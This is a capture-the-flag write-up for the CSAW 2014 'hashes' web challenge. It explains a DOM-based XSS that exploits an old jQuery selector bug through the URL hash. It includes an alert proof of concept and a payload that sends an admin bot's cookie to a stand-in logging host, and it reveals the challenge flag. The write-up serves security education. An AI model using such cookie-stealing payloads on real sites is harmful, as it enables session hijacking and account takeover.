# CSAW CTF 2014: hashes

**Category:** Web
**Points:** 300
**Description:**

> location, location, location
>
> Chal is very very stable. If you were scanning the site while I was doing dev work your requests are probably being dropped.
>
> <http://54.86.199.163:7878/>
>
> Written by ColdHeat

## Write-up

The linked page uses an old version of the jQuery library (v1.6.1), [which enables an XSS vulnerability when e.g. `$('#' + userContent)` is called](http://bugs.jquery.com/ticket/9521) ([CVE-2011-4969](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4969)). The page also contains this script:

```js
$(window).bind( 'hashchange', function(e) {
  $('.image').hide()
  tag = window.location.hash
  $(tag).show()
});
tag = window.location.hash
$(tag).show()
```

This makes it possible to inject arbitrary JavaScript simply by changing the hash in the URL. For example, [`#<img src=/ onerror=alert(1)>`](http://54.86.199.163:7878/) displays an alert box.

The page also features a form that can be used to submit image URLs that will then be visited by a bot. Assuming the bot has special admin privileges on this website, and possibly an interesting cookie, let’s try submitting this URL:

```
http://54.86.199.163:7878/#<img src=/ onerror=location='https://your-site.example.com/log?c='+document.cookie>
```

This redirects the bot to a page under our control, passing along the cookie value. The `log` script is a simple server-side script written in your language of choice that simply writes the `c` URL parameter value to a file, or stores it in a database.

A few moments after submitting the above URL, the bot indeed visits our page, and the logger script logs the cookie:

```
win="flag{these_browser_bots_are_annoying}"
```

The flag is `these_browser_bots_are_annoying`.

## Other write-ups

* <http://zoczus.blogspot.com/2014/09/csaw-ctf-web300-writeup.html>
* <http://tasteless.se/2014/09/csaw-2014-quals-hashes-web300/>
